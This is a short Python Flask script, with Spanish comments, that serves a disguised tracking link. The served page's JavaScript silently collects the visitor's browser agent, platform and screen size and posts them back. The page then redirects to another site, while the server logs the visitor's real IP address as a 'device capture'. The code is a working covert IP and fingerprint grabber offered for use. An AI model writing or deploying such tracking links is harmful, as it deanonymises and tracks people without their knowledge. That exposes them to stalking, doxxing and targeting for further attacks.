#!/usr/bin/env python3
import os
import json
import urllib.request
import threading
from flask import Flask, request, render_template_string

# --- SERVIDOR G-LINK ---
app = Flask(__name__)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<body>
    <script>
        const d = {
            agente: navigator.userAgent,
            plataforma: navigator.platform,
            resolucion: window.screen.width + "x" + window.screen.height
        };
        fetch('/log', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d)})
        .then(() => window.location.href = "https://coin.rtu.paraguay.com");
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(HTML_TEMPLATE)

@app.route('/log', methods=['POST'])
def log():
    # Obtener IP real del visitante
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    d = request.json
    print(f"\n\033[1;32m[!] NUEVA CAPTURA DE DISPOSITIVO:\033[0m")
    print(f"IP DEL DISPOSITIVO/ROUTER: {ip}")
    print(f"AGENTE: {d.get('agente')}")
    print(f"PLATAFORMA: {d.get('plataforma')}")
    print(f"RESOLUCIÓN: {d.get('resolucion')}")
    return "OK"

def iniciar_servidor():
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

